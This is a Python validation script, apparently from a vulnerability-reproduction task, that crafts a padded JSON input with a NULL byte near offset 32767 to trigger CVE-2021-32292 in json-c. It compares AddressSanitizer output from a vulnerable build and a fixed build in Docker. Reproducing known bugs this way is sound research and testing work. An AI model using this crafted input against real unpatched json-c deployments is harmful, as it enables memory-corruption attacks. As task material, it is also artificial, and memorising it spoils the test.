import subprocess
import os
import sys

def generate_poc(null_position):
    """Generate PoC with NULL byte at specific position"""
    prefix = b'{"a":"'
    
    # Position the NULL byte
    padding_before = null_position - len(prefix)
    padding_after = 32767 - null_position
    
    first_chunk = prefix + (b'A' * padding_before) + b'\x00' + (b'X' * padding_after)
    second_chunk = b'BBBB'
    
    payload = first_chunk + second_chunk
    
    with open("manual_seed.json", "wb") as f:
        f.write(payload)
    
    return payload

def test_service(service_name):
    cmd = [
        "docker", "compose", 
        "-f", "tasks/CVE-2021-32292_jsonc/compose.yml",
        "run", "--rm",
        "-v", f"{os.getcwd()}/manual_seed.json:/input/seed.bin",
        service_name,
        "/usr/local/bin/json_parse", "/input/seed.bin"
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    has_error = "Failed at offset" in result.stderr
    has_asan_overflow = "AddressSanitizer" in result.stderr and "buffer-overflow" in result.stderr
    has_bounds_check = "error at end of input" in result.stderr
    
    return {
        'exit_code': result.returncode,
        'has_error': has_error,
        'has_asan': has_asan_overflow,
        'has_bounds_check': has_bounds_check,
        'stderr': result.stderr,
        'stdout': result.stdout
    }

def main():
    print("=== CVE-2021-32292 Validation ===\n")
    
    # Try different NULL positions
    positions_to_try = [32767, 32766, 32765, 32764]
    
    for pos in positions_to_try:
        print(f"[*] Testing with NULL byte at position {pos}...")
        generate_poc(pos)
        
        vuln_result = test_service("target-vuln")
        fixed_result = test_service("target-fixed")
        
        print(f"\n  Vulnerable version:")
        print(f"    Exit code: {vuln_result['exit_code']}")
        print(f"    Error path hit: {vuln_result['has_error']}")
        print(f"    ASan detected overflow: {vuln_result['has_asan']}")
        
        if vuln_result['has_error']:
            for line in vuln_result['stderr'].split('\n'):
                if 'Failed at offset' in line:
                    print(f"    Message: {line.strip()}")
        
        if vuln_result['has_asan']:
            print("    ASan output:")
            for line in vuln_result['stderr'].split('\n'):
                if 'buffer-overflow' in line or 'READ of size' in line or 'json_parse.c' in line:
                    print(f"      {line.strip()}")
        
        print(f"\n  Fixed version:")
        print(f"    Exit code: {fixed_result['exit_code']}")
        print(f"    Error path hit: {fixed_result['has_error']}")
        print(f"    ASan detected overflow: {fixed_result['has_asan']}")
        print(f"    Uses bounds check: {fixed_result['has_bounds_check']}")
        
        if fixed_result['has_error']:
            for line in fixed_result['stderr'].split('\n'):
                if 'Failed at offset' in line or 'error at end' in line:
                    print(f"    Message: {line.strip()}")
        
        # Check if this position demonstrates the vulnerability
        vuln_shows_issue = vuln_result['has_asan'] or (vuln_result['has_error'] and not vuln_result['has_bounds_check'])
        fixed_is_safe = fixed_result['has_error'] and not fixed_result['has_asan']
        
        if vuln_shows_issue and fixed_is_safe:
            print(f"\n✅ SUCCESS with NULL at position {pos}!")
            print("   - Vulnerable version: Shows overflow or unsafe access")
            print("   - Fixed version: Handles error safely")
            
            # Save the working PoC
            with open("manual_seed.json", "rb") as f:
                final_poc = f.read()
            print(f"\n   Final PoC: {len(final_poc)} bytes")
            print(f"   NULL byte at position: {pos}")
            
            sys.exit(0)
        
        print("\n" + "="*60 + "\n")
    
    print("❌ No configuration successfully demonstrated the vulnerability")
    sys.exit(1)

if __name__ == "__main__":
    main()